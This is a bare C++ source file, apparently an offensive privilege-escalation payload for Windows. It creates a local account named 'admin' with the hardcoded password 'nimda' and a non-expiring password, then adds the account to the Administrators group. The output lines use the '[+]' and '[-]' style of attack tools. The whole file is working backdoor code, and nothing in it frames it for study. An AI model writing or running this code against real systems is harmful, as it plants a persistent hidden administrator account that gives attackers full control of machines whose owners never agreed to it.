// addadmin.exe.cpp
#include <windows.h>
#include <lm.h>
#include <iostream>

#pragma comment(lib, "netapi32.lib")

int main() {
    USER_INFO_1 ui;
    DWORD dwLevel = 1;
    DWORD dwError = 0;

    // Set username & password
    LPCWSTR username = L"admin";
    LPCWSTR password = L"nimda";

    // Setup user structure
    ZeroMemory(&ui, sizeof(ui));
    ui.usri1_name = (LPWSTR)username;
    ui.usri1_password = (LPWSTR)password;
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;

    // Create user
    NET_API_STATUS status = NetUserAdd(NULL, dwLevel, (LPBYTE)&ui, &dwError);

    if (status == NERR_Success) {
        std::wcout << L"[+] User created successfully: " << username << std::endl;

        // Add to Administrators group
        LOCALGROUP_MEMBERS_INFO_3 account;
        account.lgrmi3_domainandname = (LPWSTR)username;
        status = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);

        if (status == NERR_Success) {
            std::wcout << L"[+] User added to Administrators group." << std::endl;
        } else {
            std::wcerr << L"[-] Failed to add to group. Error: " << status << std::endl;
        }
    } else {
        std::wcerr << L"[-] Failed to create user. Error: " << status << std::endl;
    }

    return 0;
}
